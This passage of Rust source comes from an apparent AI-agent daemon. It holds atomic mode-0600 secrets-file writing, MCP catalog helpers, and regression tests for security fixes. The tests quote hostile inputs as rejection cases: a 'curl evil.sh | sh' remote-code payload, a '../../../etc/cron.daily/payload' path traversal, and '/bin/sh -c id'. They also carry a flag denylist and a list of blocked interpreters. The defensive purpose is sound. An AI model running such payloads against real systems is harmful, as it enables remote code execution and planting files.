    // write-syscall completion and the chmod-syscall completion any
    // local user on the same host could `cat ~/.librefang/secrets.env`
    // and read every provider API key the daemon has stored — the
    // exact race `save_sessions` was hardened against in #3939 /
    // #3725 (`server.rs:948-987` uses `OpenOptions::mode(0o600)` on a
    // temp file then atomic-renames). The secrets-write path missed
    // that rewrite; the TOCTOU window re-opened on every "save key"
    // dashboard action.
    //
    // Pattern: create a sibling `.tmp` file with `0600` from the
    // start, write the content, fsync, then atomic-rename onto the
    // canonical path. `rename(2)` is atomic within a filesystem; the
    // destination inode appears with `0600` already set, never at
    // umask defaults.
    atomic_write_secret_file(path, lines.join("\n") + "\n")
}

/// Remove a key from the secrets.env file.
pub(crate) fn remove_secret_env(path: &std::path::Path, key: &str) -> Result<(), std::io::Error> {
    validate_static_file_path(path, "secrets.env")
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidInput, e))?;
    if !path.exists() {
        return Ok(());
    }

    let lines: Vec<String> = std::fs::read_to_string(path)?
        .lines()
        .filter(|l| !l.starts_with(&format!("{key}=")))
        .map(|l| l.to_string())
        .collect();

    // Same mode-0600 atomic-rename pattern as `write_secret_env`.
    // `remove_secret_env` has the same TOCTOU window the audit
    // calls out — a key removal still rewrites the whole file with
    // every remaining key in plaintext.
    atomic_write_secret_file(path, lines.join("\n") + "\n")
}

/// Atomically replace `path` with `content`, ensuring the resulting
/// inode is mode `0600` (Unix) from creation — never observable at
/// the process umask. Writes to a sibling `.tmp` file first to keep
/// the rename within the same filesystem (so `rename(2)` is
/// atomic). On non-Unix targets the helper still uses the temp +
/// rename shape so partial writes can't tear the file; the
/// per-permissions bit is a no-op (Windows ACLs are inherited from
/// the parent directory, which lives under the daemon-UID user
/// profile).
fn atomic_write_secret_file(path: &std::path::Path, content: String) -> Result<(), std::io::Error> {
    use std::io::Write as _;
    let parent = path.parent().unwrap_or_else(|| std::path::Path::new("."));
    let file_name = path
        .file_name()
        .map(|n| n.to_owned())
        .unwrap_or_else(|| std::ffi::OsString::from("secrets.env"));
    let mut tmp_name = file_name;
    tmp_name.push(".tmp");
    let tmp_path = parent.join(tmp_name);

    // Open with mode 0600 from the start on Unix. The temp file is
    // discarded on any error path below so we don't leak a partial
    // write on disk.
    let mut opts = std::fs::OpenOptions::new();
    opts.write(true).create(true).truncate(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt as _;
        opts.mode(0o600);
    }
    let mut f = opts.open(&tmp_path)?;
    f.write_all(content.as_bytes())?;
    f.sync_all()?;
    drop(f);

    // `rename(2)` is atomic — the destination either contains the
    // old bytes (pre-rename) or the new bytes (post-rename); a
    // concurrent reader never observes a half-written file.
    match std::fs::rename(&tmp_path, path) {
        Ok(()) => Ok(()),
        Err(e) => {
            // Clean up the temp file so we don't accrete `*.tmp`
            // litter on partial-failure paths.
            let _ = std::fs::remove_file(&tmp_path);
            Err(e)
        }
    }
}

// ── Config.toml channel management helpers ──────────────────────────

// `CHANNEL_AOT_CONFLICT_PREFIX` was the sentinel-error prefix
// `upsert_channel_config` / `remove_channel_config` returned when
// the channel was in `[[channels.<name>]]` array-of-tables shape;
// the handler matched on the prefix to map the failure to 409
// Conflict. Both helpers + the sentinel are gone with the rest of
// the in-process channel-config write path.

// ---------------------------------------------------------------------------
// MCP catalog + reconnect + health + reload endpoints
// ---------------------------------------------------------------------------
/// Serialize a single catalog transport for API output.
fn serialize_catalog_transport(t: &librefang_types::mcp::McpCatalogTransport) -> serde_json::Value {
    match t {
        librefang_types::mcp::McpCatalogTransport::Stdio { command, args } => {
            serde_json::json!({ "type": "stdio", "command": command, "args": args })
        }
        librefang_types::mcp::McpCatalogTransport::Sse { url } => {
            serde_json::json!({ "type": "sse", "url": url })
        }
        librefang_types::mcp::McpCatalogTransport::Http { url } => {
            serde_json::json!({ "type": "http", "url": url })
        }
    }
}

/// Collect catalog ids that are "already installed" for the purposes of
/// the catalog list/detail endpoints. Includes both `template_id` matches
/// (server was installed via the template) and `name` matches (manually
/// configured server occupies the catalog entry's id), so the endpoints
/// agree with `add_mcp_server`'s 409 name-collision guard and the UI
/// doesn't offer Install on entries that will definitely fail.
fn collect_installed_catalog_ids(state: &Arc<AppState>) -> std::collections::HashSet<String> {
    let mut ids = std::collections::HashSet::new();
    for s in state.kernel.config_ref().mcp_servers.iter() {
        if let Some(tid) = s.template_id.clone() {
            ids.insert(tid);
        }
        ids.insert(s.name.clone());
    }
    ids
}

fn render_catalog_entry(
    entry: &librefang_types::mcp::McpCatalogEntry,
    installed_template_ids: &std::collections::HashSet<String>,
    lang: &str,
) -> serde_json::Value {
    // Pick the localized override (with `zh-TW` → `zh` soft fallback) and
    // fall back to the English fields per-string when no entry / field is
    // present.
    let i18n_entry = entry.i18n.get(lang).or_else(|| {
        lang.split_once('-')
            .and_then(|(base, _)| entry.i18n.get(base))
    });
    let name = i18n_entry
        .and_then(|e| e.name.as_deref())
        .unwrap_or(&entry.name);
    let description = i18n_entry
        .and_then(|e| e.description.as_deref())
        .unwrap_or(&entry.description);
    let setup_instructions = i18n_entry
        .and_then(|e| e.setup_instructions.as_deref())
        .unwrap_or(&entry.setup_instructions);

    serde_json::json!({
        "id": entry.id,
        "name": name,
        "description": description,
        "icon": entry.icon,
        "category": entry.category.to_string(),
        "installed": installed_template_ids.contains(&entry.id),
        "tags": entry.tags,
        "transport": serialize_catalog_transport(&entry.transport),
        "required_env": entry.required_env.iter().map(|e| serde_json::json!({
            "name": e.name,
            "label": e.label,
            "help": e.help,
            "is_secret": e.is_secret,
            "get_url": e.get_url,
        })).collect::<Vec<_>>(),
        "has_oauth": entry.oauth.is_some(),
        "setup_instructions": setup_instructions,
    })
}

// ---------------------------------------------------------------------------
// Extension management endpoints — kept as dashboard-friendly aliases over
// the unified store. Installed state comes from config.mcp_servers with
// `template_id` set; catalog-only entries come from the McpCatalog.
// ---------------------------------------------------------------------------
fn installed_servers_by_template(
    servers: &[librefang_types::config::McpServerConfigEntry],
) -> std::collections::HashMap<String, &librefang_types::config::McpServerConfigEntry> {
    let mut map = std::collections::HashMap::new();
    for s in servers {
        if let Some(tid) = &s.template_id {
            map.insert(tid.clone(), s);
        }
    }
    map
}

fn status_str_for_catalog(
    template_id: &str,
    installed_by_template: &std::collections::HashMap<
        String,
        &librefang_types::config::McpServerConfigEntry,
    >,
    health: &librefang_extensions::health::HealthMonitor,
) -> &'static str {
    match installed_by_template.get(template_id) {
        Some(srv) => match health.get_health(&srv.name).as_ref().map(|h| &h.status) {
            Some(librefang_types::mcp::McpStatus::Ready) => "ready",
            Some(librefang_types::mcp::McpStatus::Error(_)) => "error",
            _ => "installed",
        },
        None => "available",
    }
}

/// Recursively copy a directory tree.
fn copy_dir_recursive(src: &std::path::Path, dst: &std::path::Path) -> std::io::Result<()> {
    std::fs::create_dir_all(dst)?;
    for entry in std::fs::read_dir(src)? {
        let entry = entry?;
        let ty = entry.file_type()?;
        let dest_path = dst.join(entry.file_name());
        if ty.is_dir() {
            copy_dir_recursive(&entry.path(), &dest_path)?;
        } else {
            std::fs::copy(entry.path(), &dest_path)?;
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use librefang_types::config::{McpServerConfigEntry, McpTransportEntry};

    /// Regression for #2319: adding an MCP server through the UI wrote each
    /// entry as a JSON-stringified blob inside `mcp_servers = ['{"name":...}']`
    /// instead of a `[[mcp_servers]]` TOML table, because the top-level object
    /// hit the catch-all in `json_to_toml_value` and got stringified. After
    /// the fix, the on-disk file must round-trip back into a real
    /// `McpServerConfigEntry` via `toml::from_str`.
    #[test]
    fn upsert_mcp_server_writes_inline_table_not_stringified_json() {
        let tmp = tempfile::tempdir().unwrap();
        let config_path = tmp.path().join("config.toml");
        std::fs::write(&config_path, "").unwrap();

        let entry = McpServerConfigEntry {
            name: "nocodb".to_string(),
            template_id: None,
            transport: Some(McpTransportEntry::Stdio {
                command: "npx".to_string(),
                args: vec![
                    "-y".to_string(),
                    "mcp-remote".to_string(),
                    "http://nocodb:8080/mcp/abc".to_string(),
                ],
            }),
            timeout_secs: 30,
            env: vec![],
            headers: vec!["xc-mcp-token: secret".to_string()],
            oauth: None,
            taint_scanning: true,
            taint_policy: None,
        };

        upsert_mcp_server_config(&config_path, &entry).expect("upsert should succeed");

        let raw = std::fs::read_to_string(&config_path).unwrap();
        assert!(
            !raw.contains("mcp_servers = ['{"),
            "mcp_servers must not be written as stringified JSON — got:\n{raw}"
        );
        assert!(
            !raw.contains("mcp_servers = [\"{"),
            "mcp_servers must not be written as stringified JSON — got:\n{raw}"
        );

        #[derive(serde::Deserialize)]
        struct Wrapper {
            mcp_servers: Vec<McpServerConfigEntry>,
        }
        let parsed: Wrapper =
            toml::from_str(&raw).expect("config.toml must deserialize into McpServerConfigEntry");
        assert_eq!(parsed.mcp_servers.len(), 1);
        let roundtripped = &parsed.mcp_servers[0];
        assert_eq!(roundtripped.name, "nocodb");
        assert_eq!(roundtripped.timeout_secs, 30);
        assert_eq!(roundtripped.headers, vec!["xc-mcp-token: secret"]);
        match &roundtripped.transport {
            Some(McpTransportEntry::Stdio { command, args }) => {
                assert_eq!(command, "npx");
                assert_eq!(args, &["-y", "mcp-remote", "http://nocodb:8080/mcp/abc"]);
            }
            other => panic!("expected stdio transport, got {other:?}"),
        }
    }

    /// A second upsert for the same name must replace the entry in-place,
    /// not produce a second row — this is how the user ended up with three
    /// stale duplicate blobs in the bug report.
    #[test]
    fn upsert_mcp_server_replaces_existing_entry_with_same_name() {
        let tmp = tempfile::tempdir().unwrap();
        let config_path = tmp.path().join("config.toml");
        std::fs::write(&config_path, "").unwrap();

        let v1 = McpServerConfigEntry {
            name: "nocodb".to_string(),
            template_id: None,
            transport: Some(McpTransportEntry::Http {
                url: "http://old:8080/mcp".to_string(),
            }),
            timeout_secs: 10,
            env: vec![],
            headers: vec![],
            oauth: None,
            taint_scanning: true,
            taint_policy: None,
        };
        upsert_mcp_server_config(&config_path, &v1).unwrap();

        let v2 = McpServerConfigEntry {
            name: "nocodb".to_string(),
            template_id: None,
            transport: Some(McpTransportEntry::Http {
                url: "http://new:9090/mcp".to_string(),
            }),
            timeout_secs: 60,
            env: vec![],
            headers: vec![],
            oauth: None,
            taint_scanning: true,
            taint_policy: None,
        };
        upsert_mcp_server_config(&config_path, &v2).unwrap();

        #[derive(serde::Deserialize)]
        struct Wrapper {
            mcp_servers: Vec<McpServerConfigEntry>,
        }
        let raw = std::fs::read_to_string(&config_path).unwrap();
        let parsed: Wrapper = toml::from_str(&raw).unwrap();
        assert_eq!(
            parsed.mcp_servers.len(),
            1,
            "upsert must replace, not append"
        );
        assert_eq!(parsed.mcp_servers[0].timeout_secs, 60);
        match &parsed.mcp_servers[0].transport {
            Some(McpTransportEntry::Http { url }) => assert_eq!(url, "http://new:9090/mcp"),
            other => panic!("expected http transport, got {other:?}"),
        }
    }

    /// Regression for #5799: patching taint_scanning=false on one server must
    /// not affect the taint_scanning value of any other server in the file.
    ///
    /// The upsert reads the whole config.toml, replaces the matching entry,
    /// and re-serialises. This test confirms the round-trip preserves each
    /// server's independent taint_scanning field so the two-server scenario
    /// reported in #5799 (one disabled, one still enabled) survives a write.
    #[test]
    fn upsert_mcp_server_taint_scanning_false_does_not_affect_other_servers() {
        let tmp = tempfile::tempdir().unwrap();
        let config_path = tmp.path().join("config.toml");
        std::fs::write(&config_path, "").unwrap();

        // Add server A (taint enabled, the default).
        let server_a = McpServerConfigEntry {
            name: "server-a".to_string(),
            template_id: None,
            transport: Some(McpTransportEntry::Stdio {
                command: "npx".to_string(),
                args: vec!["mcp-a".to_string()],
            }),
            timeout_secs: 30,
            env: vec![],
            headers: vec![],
            oauth: None,
            taint_scanning: true,
            taint_policy: None,
        };
        upsert_mcp_server_config(&config_path, &server_a).unwrap();

        // Add server B (taint also enabled initially).
        let server_b = McpServerConfigEntry {
            name: "server-b".to_string(),
            template_id: None,
            transport: Some(McpTransportEntry::Stdio {
                command: "npx".to_string(),
                args: vec!["mcp-b".to_string()],
            }),
            timeout_secs: 30,
            env: vec![],
            headers: vec![],
            oauth: None,
            taint_scanning: true,
            taint_policy: None,
        };
        upsert_mcp_server_config(&config_path, &server_b).unwrap();

        // Simulate the PATCH /api/mcp/servers/server-a/taint disabling scanning on A.
        let server_a_patched = McpServerConfigEntry {
            name: "server-a".to_string(),
            taint_scanning: false,
            ..server_a.clone()
        };
        upsert_mcp_server_config(&config_path, &server_a_patched).unwrap();

        // Deserialise and assert per-server independence.
        #[derive(serde::Deserialize)]
        struct Wrapper {
            mcp_servers: Vec<McpServerConfigEntry>,
        }
        let raw = std::fs::read_to_string(&config_path).unwrap();
        let parsed: Wrapper = toml::from_str(&raw).expect("round-tripped TOML must parse cleanly");
        assert_eq!(
            parsed.mcp_servers.len(),
            2,
            "must still have exactly 2 servers"
        );

        let a = parsed
            .mcp_servers
            .iter()
            .find(|s| s.name == "server-a")
            .expect("server-a missing");
        let b = parsed
            .mcp_servers
            .iter()
            .find(|s| s.name == "server-b")
            .expect("server-b missing");

        assert!(
            !a.taint_scanning,
            "server-a must have taint_scanning=false after patch"
        );
        assert!(
            b.taint_scanning,
            "server-b must retain taint_scanning=true — patching server-a must not affect it"
        );
    }

    // 16 channel-config tests (upsert / remove / append / update /
    // remove_channel_instance, AoT-conflict guards, legacy-table
    // promotion) retired alongside the helper functions they
    // exercised — every channel runs as a sidecar so the `[channels.<x>]`
    // TOML write path has zero callers.

    // ── escape_env_value tests (Bug #3790) ─────────────────────────────────

    #[test]
    fn escape_env_value_plain_value_unchanged() {
        assert_eq!(escape_env_value("hello"), "hello");
        assert_eq!(escape_env_value("sk-abc123"), "sk-abc123");
    }

    #[test]
    fn escape_env_value_newline_becomes_backslash_n() {
        let raw = "line1\nline2";
        let escaped = escape_env_value(raw);
        assert_eq!(escaped, "line1\\nline2");
        // Must not contain a literal newline character.
        assert!(!escaped.contains('\n'));
    }

    #[test]
    fn escape_env_value_carriage_return_becomes_backslash_r() {
        let raw = "val\r\nend";
        let escaped = escape_env_value(raw);
        assert_eq!(escaped, "val\\r\\nend");
        assert!(!escaped.contains('\r'));
        assert!(!escaped.contains('\n'));
    }

    #[test]
    fn escape_env_value_backslash_is_doubled() {
        let raw = r"C:\Users\secret";
        let escaped = escape_env_value(raw);
        assert_eq!(escaped, r"C:\\Users\\secret");
    }

    #[test]
    fn escape_env_value_backslash_before_newline_double_escapes_correctly() {
        // "\\\n" → the backslash must be doubled before the newline is escaped,
        // producing "\\\\n" (a literal backslash-backslash-n), not "\\n".
        let raw = "\\\n";
        let escaped = escape_env_value(raw);
        assert_eq!(escaped, "\\\\\\n");
        assert!(!escaped.contains('\n'));
    }

    /// Regression for audit `write-secret-env-toctou`. After a
    /// successful `write_secret_env`, the resulting file must be
    /// mode `0o600` from the moment it appears on disk — the
    /// atomic-rename pattern guarantees the file never exists
    /// readable-to-other-UIDs even for one syscall.
    #[cfg(unix)]
    #[test]
    fn write_secret_env_yields_mode_0600() {
        use std::os::unix::fs::PermissionsExt as _;
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("secrets.env");
        write_secret_env(&path, "ANTHROPIC_API_KEY", "sk-secret-123").unwrap();
        let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o600,
            "secrets.env must be 0o600 immediately after write; got {mode:o}",
        );
    }

    /// `remove_secret_env` rewrites the whole file with every
    /// remaining key — the audit's TOCTOU window applies equally
    /// to this path, so the post-condition mode must also be 0600.
    #[cfg(unix)]
    #[test]
    fn remove_secret_env_yields_mode_0600() {
        use std::os::unix::fs::PermissionsExt as _;
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("secrets.env");
        write_secret_env(&path, "A", "1").unwrap();
        write_secret_env(&path, "B", "2").unwrap();
        // Deliberately clobber the mode to 0644 (the umask default
        // the pre-fix code left in the window) so the assertion
        // below proves the post-condition is restored, not just
        // inherited from the prior write.
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();
        remove_secret_env(&path, "A").unwrap();
        let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o600,
            "remove_secret_env must restore 0o600 on rewrite; got {mode:o}",
        );
    }

    /// The atomic-rename `*.tmp` sibling must not survive a
    /// successful write. Leaving the temp file would (a) accrete
    /// litter under `~/.librefang/` and (b) leave the previous
    /// secret value readable from the `.tmp` inode until the next
    /// write overwrites it.
    #[test]
    fn write_secret_env_cleans_up_tmp_file() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("secrets.env");
        write_secret_env(&path, "OPENAI_API_KEY", "sk-1").unwrap();
        let tmp_path = path.with_file_name("secrets.env.tmp");
        assert!(
            !tmp_path.exists(),
            "tmp sibling must be gone after atomic rename completes",
        );
    }

    #[test]
    fn write_secret_env_value_with_newline_is_rejected() {
        // Implementation tightened to reject newlines in the value rather
        // than escape them — escape-into-single-line was the old behaviour
        // (see this test's previous name) but it left a real injection
        // surface for callers that didn't expect dotenv parsers to honour
        // backslash sequences.  Now we fail-closed: caller must sanitise
        // before passing. (`write_service_account_env` was folded into the
        // generic `write_secret_env` when google_chat/webhook moved out.)
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("secrets.env");
        let err = write_secret_env(&path, "API_KEY", "val\nwith\nnewlines").unwrap_err();
        assert_eq!(err.kind(), std::io::ErrorKind::InvalidInput);
        assert!(
            err.to_string().contains("newline"),
            "error should mention newlines, got: {err}"
        );
        // No file should have been written.
        assert!(
            !path.exists(),
            "secrets.env must not be created on validation error"
        );
    }

    /// Regression for #5857: on Windows the dashboard "save provider key"
    /// action failed with `unsafe path 'C:\Users\root\.librefang\secrets.env'`.
    /// `validate_static_file_path` (the gate on every secrets.env / config.toml
    /// write) used to reject `Component::Prefix(_)` alongside `ParentDir`, and a
    /// Windows absolute path always carries a drive-letter prefix — so every
    /// legitimate, server-constructed `home_dir().join("secrets.env")` tripped
    /// the check. PR #1770 narrowed the rejection to `ParentDir` only; this
    /// asserts the drive-letter prefix is accepted so the rejection cannot be
    /// re-added without failing the Windows CI shard.
    #[cfg(windows)]
    #[test]
    fn validate_static_file_path_accepts_windows_drive_prefix() {
        let path = std::path::Path::new(r"C:\Users\root\.librefang\secrets.env");
        // Sanity: the host parser really does emit a drive-letter prefix here,
        // otherwise the assertion below would pass vacuously.
        assert!(
            path.components()
                .any(|c| matches!(c, std::path::Component::Prefix(_))),
            "test precondition: Windows path must carry a Component::Prefix",
        );
        assert!(
            validate_static_file_path(path, "secrets.env").is_ok(),
            "a server-constructed Windows absolute secrets.env path must validate; \
             rejecting Component::Prefix re-introduces #5857",
        );
    }

    /// Platform-independent companion to the #5857 guard above. The Windows
    /// `Prefix` component is unreachable on a Unix test host, but the contract —
    /// "reject `..`, accept everything else for the fixed filename" — is the
    /// same on every platform and must hold for the boot-time path shape the
    /// daemon actually constructs (`home_dir().join("secrets.env")`).
    #[test]
    fn validate_static_file_path_rejects_parent_dir_only() {
        let tmp = tempfile::tempdir().unwrap();
        let good = tmp.path().join("secrets.env");
        assert!(
            validate_static_file_path(&good, "secrets.env").is_ok(),
            "an absolute, traversal-free secrets.env path must validate",
        );

        let traversal = tmp.path().join("..").join("secrets.env");
        let err = validate_static_file_path(&traversal, "secrets.env")
            .expect_err("a `..` component must be rejected");
        assert!(
            err.contains("unsafe path"),
            "rejection message should flag the unsafe path, got: {err}",
        );
    }
}

#[cfg(test)]
mod skill_identifier_validation {
    //! Regression guards for the `skill-install-path-traversal` audit
    //! item. `install_skill` joins both `req.name` and `req.hand`
    //! onto filesystem paths (`registry/skills/<name>/`,
    //! `workspaces/hands/<hand>/`), so a missing validator made the
    //! handler an FS-existence oracle (200 vs 404) and a write
    //! primitive (`copy_dir_recursive` outside `~/.librefang/skills/`).
    //! These tests pin the accept / reject envelope of
    //! `validate_skill_identifier`.
    use super::validate_skill_identifier;

    #[test]
    fn accepts_simple_names() {
        for ok in ["weather", "weather-v2", "a", "Abc_DEF-123", "skill_42"] {
            assert!(
                validate_skill_identifier(ok, "name").is_ok(),
                "expected '{ok}' to validate",
            );
        }
    }

    #[test]
    fn rejects_dot_dot_traversal() {
        let err = validate_skill_identifier("..", "name").unwrap_err();
        assert!(err.contains("invalid skill name"), "got {err:?}");
    }

    #[test]
    fn rejects_relative_traversal_payload() {
        // The exploit literal from the audit doc.
        let err = validate_skill_identifier("../../../etc/cron.daily/payload", "name").unwrap_err();
        assert!(err.contains("invalid skill name"), "got {err:?}");
    }

    #[test]
    fn rejects_forward_slash() {
        let err = validate_skill_identifier("foo/bar", "name").unwrap_err();
        assert!(err.contains("invalid skill name"), "got {err:?}");
    }

    #[test]
    fn rejects_backslash() {
        let err = validate_skill_identifier("foo\\bar", "name").unwrap_err();
        assert!(err.contains("invalid skill name"), "got {err:?}");
    }

    #[test]
    fn rejects_leading_dot() {
        let err = validate_skill_identifier(".hidden", "name").unwrap_err();
        assert!(
            err.contains("invalid skill name"),
            "leading-dot dotfile must be rejected; got {err:?}",
        );
    }

    #[test]
    fn rejects_leading_hyphen_and_underscore() {
        for bad in ["-foo", "_foo"] {
            let err = validate_skill_identifier(bad, "name").unwrap_err();
            assert!(
                err.contains("must start with"),
                "leading non-alphanumeric '{bad}' must be rejected; got {err:?}",
            );
        }
    }

    #[test]
    fn rejects_empty() {
        let err = validate_skill_identifier("", "name").unwrap_err();
        assert!(err.contains("invalid skill name"), "got {err:?}");
    }

    #[test]
    fn rejects_too_long() {
        let long = "a".repeat(65);
        let err = validate_skill_identifier(&long, "name").unwrap_err();
        assert!(
            err.contains("1-64"),
            "expected 1-64 length message; got {err:?}"
        );
    }

    #[test]
    fn rejects_non_ascii() {
        // Unicode lookalikes (Cyrillic 'а' vs Latin 'a') would be a
        // confusable-character attack vector. The validator is
        // ASCII-only on purpose.
        let err = validate_skill_identifier("\u{0430}weather", "name").unwrap_err();
        assert!(err.contains("invalid skill name"), "got {err:?}");
    }

    #[test]
    fn rejects_dots_inside_name() {
        // `foo.bar` is rejected — dots have no place in skill ids
        // (no extensions, no namespacing). Audit doc was explicit
        // about leading-dot rejection; this extends to mid-string
        // dots for defence in depth (path-normalisation edge cases
        // with `./` segments).
        let err = validate_skill_identifier("foo.bar", "name").unwrap_err();
        assert!(err.contains("invalid skill name"), "got {err:?}");
    }

    #[test]
    fn field_label_propagates_to_error_message() {
        // When the validator is called on `hand`, the error must
        // say "hand" so the client knows which payload field to
        // fix. The handler relies on this to keep client errors
        // actionable across both inputs.
        let err = validate_skill_identifier("../oops", "hand").unwrap_err();
        assert!(
            err.contains("invalid skill hand"),
            "expected 'hand' in message; got {err:?}",
        );
    }
}

#[cfg(test)]
mod install_deps_argv_validation {
    //! Regression guards for the `install-deps-rce-admin` audit item.
    //!
    //! `POST /api/hands/{hand_id}/install-deps` ran `Command::new(parts[0])`
    //! against `install_deps` strings authored by Admin in HAND.toml. The
    //! historical guard was a metacharacter blocklist (`;|&$\`><(){}\n\r`)
    //! which an Admin could bypass with
    //!     `install_deps = ["python", "-c", "import os; os.system('curl …')"]`
    //! because the punctuation lives inside the quoted `-c` argument and
    //! the top-level command string has none of the blocked characters.
    //! This module pins the new (program-allowlist + flag-denylist)
    //! envelope of `validate_install_deps_argv`.
    use super::validate_install_deps_argv;

    #[test]
    fn accepts_legitimate_package_manager_commands() {
        // Each entry mirrors a realistic per-platform `install_deps`
        // string the handler would otherwise have rejected.
        let ok = [
            ("pip", vec!["install", "requests"]),
            ("pip3", vec!["install", "--user", "yt-dlp"]),
            ("npm", vec!["install", "-g", "typescript"]),
            ("apt", vec!["install", "-y", "ffmpeg"]),
            ("apt-get", vec!["install", "-y", "curl"]),
            ("dnf", vec!["install", "-y", "ffmpeg"]),
            ("pacman", vec!["-S", "--noconfirm", "ffmpeg"]),
            ("brew", vec!["install", "ffmpeg"]),
            (
                "winget",
                vec![
                    "install",
                    "Gyan.FFmpeg",
                    "--accept-source-agreements",
                    "--accept-package-agreements",
                ],
            ),
            ("cargo", vec!["install", "ripgrep"]),
        ];
        for (prog, args) in ok {
            assert!(
                validate_install_deps_argv(prog, &args).is_ok(),
                "expected '{prog} {args:?}' to validate"
            );
        }
    }

    #[test]
    fn rejects_dash_c_payload_under_allowlisted_interpreter_alias() {
        // The historical exploit literal from the audit doc. `python`
        // is not allowlisted, so this fails at the program check first.
        let err = validate_install_deps_argv(
            "python",
            &["-c", "import os; os.system('curl evil.sh | sh')"],
        )
        .unwrap_err();
        assert!(err.contains("not in install-deps allowlist"), "got {err:?}");

        // …and even if a future allowlist entry slips an interpreter in
        // (regression guard), the `-c` flag check stops the payload.
        // We pick `pip` as a stand-in: `pip -c …` is meaningless but
        // proves the flag check fires independent of the program.
        let err = validate_install_deps_argv("pip", &["-c", "anything"]).unwrap_err();
        assert!(err.contains("disallowed flag"), "got {err:?}");
        assert!(err.contains("-c"), "got {err:?}");
    }

    #[test]
    fn rejects_eval_and_exec_flag_variants() {
        for flag in ["--eval", "--exec", "--shell", "--command", "-e"] {
            let err = validate_install_deps_argv("npm", &[flag, "code"]).unwrap_err();
            assert!(
                err.contains("disallowed flag"),
                "expected '{flag}' to be rejected; got {err:?}"
            );
        }
        // `=value` long-form variants (e.g. `node --eval=…` style) — the
        // bare-flag check would miss these since `--eval=foo != --eval`.
        for combined in [
            "--exec=touch /tmp/x",
            "--shell=/bin/sh",
            "--eval=process.exit(0)",
            "--command=ls",
        ] {
            let err = validate_install_deps_argv("npm", &[combined]).unwrap_err();
            assert!(
                err.contains("disallowed flag"),
                "expected '{combined}' to be rejected; got {err:?}"
            );
        }
        // Case-insensitive: `--EVAL` and friends must still fail. A naive
        // exact-match check would let an attacker bypass via casing.
        let err = validate_install_deps_argv("npm", &["--EVAL", "x"]).unwrap_err();
        assert!(err.contains("disallowed flag"), "got {err:?}");
    }

    #[test]
    fn rejects_absolute_unix_path() {
        let err = validate_install_deps_argv("/bin/sh", &["-c", "id"]).unwrap_err();
        assert!(err.contains("absolute path"), "got {err:?}");
    }

    #[test]
    fn rejects_windows_backslash_paths() {
        // Both the verbatim `\\?\C:\…` shape and a plain
        // `C:\Windows\…` candidate trip the backslash check before
        // the allowlist would otherwise miss them.
        for prog in [
            r"\\?\C:\Windows\System32\cmd.exe",
            r"C:\Windows\System32\cmd.exe",
            r"foo\bar",
        ] {
            let err = validate_install_deps_argv(prog, &["/c", "dir"]).unwrap_err();
            assert!(
                err.contains("absolute path"),
                "expected '{prog}' rejected as absolute-path; got {err:?}"
            );
        }
    }

    #[test]
    fn rejects_non_allowlisted_program() {
        for prog in ["python", "python3", "node", "ruby", "perl", "bash", "sh"] {
            let err = validate_install_deps_argv(prog, &["install", "foo"]).unwrap_err();
            assert!(
                err.contains("not in install-deps allowlist"),
                "expected '{prog}' rejected by allowlist; got {err:?}"
            );
        }
    }
}
